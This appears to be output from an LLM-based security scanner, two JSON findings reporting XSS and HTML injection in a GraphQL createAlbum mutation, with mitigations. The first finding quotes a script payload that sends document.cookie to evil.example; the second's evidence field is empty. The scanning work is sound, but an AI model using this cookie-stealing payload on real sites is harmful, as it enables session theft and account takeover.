llm_results: [{"detection_name": "LLM: xss_injection", "detection": "vulnerable", "category": "Injection Attacks", "description": "The GraphQL response returns the album title containing a raw <script> tag and JavaScript that attempts to exfiltrate document.cookie. This is clear evidence of unsanitized/unsafe user-controllable content being stored or reflected by the API. If a client (web application) injects this field value into the DOM without proper output encoding or sanitization, the script will execute in the victim's browser (stored or reflected XSS), enabling session theft, account takeover, or other malicious actions. Recommendations: ensure server-side validation and canonicalization of inputs, HTML-encode/escape values before inserting into the DOM, adopt a strict Content Security Policy, mark sensitive cookies HttpOnly/Secure, and treat GraphQL string fields as untrusted by default.", "evidence": "\"title\": \"<script>fetch('https://evil.example/steal?c='+document.cookie)</script>\"", "confidence": 0.9, "llm_analysis": {"is_vulnerable": true, "vulnerability_type": "xss_injection", "severity": "HIGH", "confidence": 0.9, "evidence": "\"title\": \"<script>fetch('https://evil.example/steal?c='+document.cookie)</script>\"", "explanation": "The GraphQL response returns the album title containing a raw <script> tag and JavaScript that attempts to exfiltrate document.cookie. This is clear evidence of unsanitized/unsafe user-controllable content being stored or reflected by the API. If a client (web application) injects this field value into the DOM without proper output encoding or sanitization, the script will execute in the victim's browser (stored or reflected XSS), enabling session theft, account takeover, or other malicious actions. Recommendations: ensure server-side validation and canonicalization of inputs, HTML-encode/escape values before inserting into the DOM, adopt a strict Content Security Policy, mark sensitive cookies HttpOnly/Secure, and treat GraphQL string fields as untrusted by default."}}]

llm_results: [{"detection_name": "LLM: html_injection", "detection": "vulnerable", "category": "Injection Attacks", "description": "The GraphQL response contains unescaped HTML markup in the 'title' field: an tag with an onerror JavaScript handler. If this value is rendered into a web page without proper output encoding or sanitization, the onerror handler can execute arbitrary script in users' browsers (client-side XSS/HTML injection). The createAlbum mutation appears to reflect/store and return the raw HTML, indicating a stored/reflected HTML injection risk. Mitigations: validate and sanitize input server-side, escape/HTML-encode user-controlled content on output, enforce a strict Content Security Policy, and use a safe rendering context for any rich content.", "evidence": "data.createAlbum.title = \"\"", "confidence": 0.9, "llm_analysis": {"is_vulnerable": true, "vulnerability_type": "html_injection", "severity": "HIGH", "confidence": 0.9, "evidence": "data.createAlbum.title = \"\"", "explanation": "The GraphQL response contains unescaped HTML markup in the 'title' field: an tag with an onerror JavaScript handler. If this value is rendered into a web page without proper output encoding or sanitization, the onerror handler can execute arbitrary script in users' browsers (client-side XSS/HTML injection). The createAlbum mutation appears to reflect/store and return the raw HTML, indicating a stored/reflected HTML injection risk. Mitigations: validate and sanitize input server-side, escape/HTML-encode user-controlled content on output, enforce a strict Content Security Policy, and use a safe rendering context for any rich content."}}]
